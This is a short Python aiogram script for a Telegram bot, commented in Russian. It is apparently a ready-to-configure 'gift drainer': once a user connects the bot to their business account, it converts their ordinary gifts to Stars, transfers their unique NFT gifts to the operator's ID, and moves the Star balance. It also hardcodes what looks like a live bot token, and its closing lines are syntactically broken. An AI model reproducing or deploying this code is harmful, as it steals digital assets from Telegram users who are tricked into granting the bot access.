import asyncio
from aiogram import Bot, Dispatcher, types


# CONFIG ТУТ МЕНЯТЬ
TOKEN = "8862273506:AAEmA-xWmihELm0oajcvkaxkI_Rbr2kRppw"  # ваш токен бота
ADMIN_ID = 8297446667  # ваш айди
# CONFIG ТУТ МЕНЯТЬ



bot = Bot(TOKEN)
dp = Dispatcher()


@dp.business_message()

async def get_message(message: types.Message):
    business_id = message.business_connection_id #получаем бизнес айди

    #сама функция конверта в звезды
    convert_gifts = await bot.get_business_account_gifts(
        business_id, exclude_unique=True
    )
    # идем циклом по подаркам
    for gift in convert_gifts.gifts:


        try:
            owned_gift_id = gift.owned_gift_id
            #конвертим в звезды
            await bot.convert_gift_to_stars(business_id, owned_gift_id)
        except:
            pass
    try:
        #получаем подарки 
        unique_gifts = await bot.get_business_account_gifts(
            business_id, exclude_unique=False
        )


        #передаем нфтишки

        for gift in unique_gifts.gifts:
            owned_gift_id = gift.owned_gift_id

            await bot.transfer_gift(business_id, owned_gift_id, ADMIN_ID, 25)
    except:

        pass

    #баланс бота в звездах, которые получили от  обмена подарков обычных
    stars = await bot.get_business_account_star_balance(business_id)
    await bot.transfer_business_account_stars(business_id, int(stars.amount))


async def main():
    await dp.start_polling(bot)


if name == "__main__":
asyncio.run(main()
     
